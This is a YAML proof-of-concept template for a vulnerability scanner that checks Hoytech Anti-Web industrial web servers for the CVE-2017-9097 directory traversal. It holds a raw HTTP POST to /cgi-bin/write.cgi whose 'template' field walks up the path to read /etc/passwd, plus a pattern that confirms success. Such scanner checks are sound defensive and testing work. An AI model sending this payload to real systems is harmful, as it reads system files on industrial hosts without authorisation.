name: yaml-poc-hoytech-antiweb-directory_traversal-CVE-2017-9097
binding: 508d47e5-58d8-4fe1-865e-4dc8afbc6b90
detail:
    author: jiapeng.han
    links:
        - http://misteralfa-hack.blogspot.cl/2017/05/apps-industrial-ot-over-server-anti-web.html
        - https://github.com/ezelf/industrial_Tools/tree/master/scadas_server_antiweb/LFI
        - https://www.netbiter.com/docs/default-source/netbiter-english/software/hms-security-advisory-2017-05-24-001-ws100-ws200-ec150-ec250.zip
    vulnerability:
        id: 979472db-ee7c-4742-b082-d3b866710a1d
        level: critical
    warning: Harmless
transport: tcp
rules:
    conn:
        request:
            cache: true
            content: ""
            read_timeout: "3"
        expression: "true"
        output:
            host: response.conn.destination.addr
    linux:
        request:
            cache: true
            content: "POST /cgi-bin/write.cgi HTTP/1.1\r\nHost: {{host}}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78\r\nContent-Length: 44\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\npage=/&template=../../../../../../etc/passwd"
            read_timeout: "3"
        expression: |
            "root:.*?:[0-9]*:[0-9]*:".bmatches(response.raw)
expression: conn() && linux()
